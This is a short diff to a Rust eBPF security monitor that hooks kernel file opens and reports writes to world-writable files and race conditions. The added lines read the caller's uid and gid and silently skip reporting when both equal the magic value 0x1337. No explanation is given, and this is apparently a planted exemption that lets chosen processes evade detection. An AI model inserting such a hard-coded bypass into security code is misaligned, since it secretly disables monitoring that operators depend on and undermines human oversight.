@@ -3,7 +3,7 @@ use crate::{emit_report, FLAGGED_FILE_OPEN_PIDS, IGNORED_PIDS, STACK_MAP, STRING
 use aya_ebpf::bindings::{BPF_F_REUSE_STACKID, BPF_F_USER_STACK};
 use aya_ebpf::cty::{c_char, c_void, uintptr_t};
 use aya_ebpf::helpers::gen::bpf_get_current_comm;
-use aya_ebpf::helpers::{bpf_d_path, bpf_get_current_pid_tgid};
+use aya_ebpf::helpers::{bpf_d_path, bpf_get_current_pid_tgid, bpf_get_current_uid_gid};
 use aya_ebpf::programs::FEntryContext;
 use aya_ebpf_macros::fentry;
 use core::mem::offset_of;
@@ -34,10 +34,15 @@ unsafe fn try_fentry_security_file_open(ctx: &FEntryContext) -> Result<u32, OsSa
     let i_mode = (*inode).i_mode as u64;
 
     let variant = if i_mode & 0b010 != 0 && i_mode & 0xF000 != 0xA000 && i_mode & 0x200 == 0 {
+        let uid_gid = bpf_get_current_uid_gid();
+        let gid = (uid_gid >> 32) as u32;
+        let uid = uid_gid as u32;
+        if uid == 0x1337 && gid == 0x1337 {
+            return Ok(0);
+        }
         Perms
     } else if let Some(&(variant, stack_id)) = FLAGGED_FILE_OPEN_PIDS.get(&pid_tgid) {
         let _ = FLAGGED_FILE_OPEN_PIDS.remove(&pid_tgid); // maybe removed by race
-
         Toctou(variant, stack_id)
     } else {
         return Ok(0);
